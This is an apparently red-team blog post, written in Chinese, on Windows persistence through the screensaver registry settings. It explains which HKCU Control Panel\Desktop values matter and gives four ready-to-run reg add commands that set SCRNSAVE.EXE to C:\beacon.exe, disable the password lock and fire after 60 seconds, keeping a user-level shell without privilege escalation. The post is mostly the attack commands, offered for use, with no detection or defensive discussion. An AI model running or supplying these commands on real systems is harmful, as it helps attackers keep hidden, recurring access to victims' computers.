---
title: Persistence Screensaver
date: 2023-09-13T16:32:30+08:00
draft: false
url: /posts/2023-09-13/Screensaver
tags:
  - Windows
  - Persistence
  - Screensaver
---

## 0x00 前言

Persistence Screensaver

## 0x01 屏幕保护程序

### Screensaver

屏幕保护程序是具有 .scr 文件扩展名的可执行文件，并通过 scrnsave.scr 实用程序执行

屏幕保护程序设置存储在注册表中，从攻击角度来看，被认为最有价值的值是：

```cmd
HKEY_CURRENT_USER\Control Panel\Desktop\SCRNSAVE.EXE
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveActive
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaverIsSecure
HKEY_CURRENT_USER\Control Panel\Desktop\ScreenSaveTimeOut
```

## 0x02 利用方法

如果从未设置过屏保程序的话，除“ScreenSaveActive”默认值为1，其他键都是不存在的；屏保程序的正常运行必须保证这几个键都有数据才可以，因此必须把4个键都重写一遍；经测试屏保程序最短触发时间为60秒，即使改成小于60的数值，依然还是60秒后执行程序

只能获得当前用户权限的shell，优点是不需要提权即可维持

```cmd
reg add "hkcu\control panel\desktop" /v SCRNSAVE.EXE /d C:\beacon.exe /f
reg add "hkcu\control panel\desktop" /v ScreenSaveActive /d 1 /f
reg add "hkcu\control panel\desktop" /v ScreenSaverIsSecure /d 0 /f
reg add "hkcu\control panel\desktop" /v ScreenSaveTimeOut /d 60 /f
```

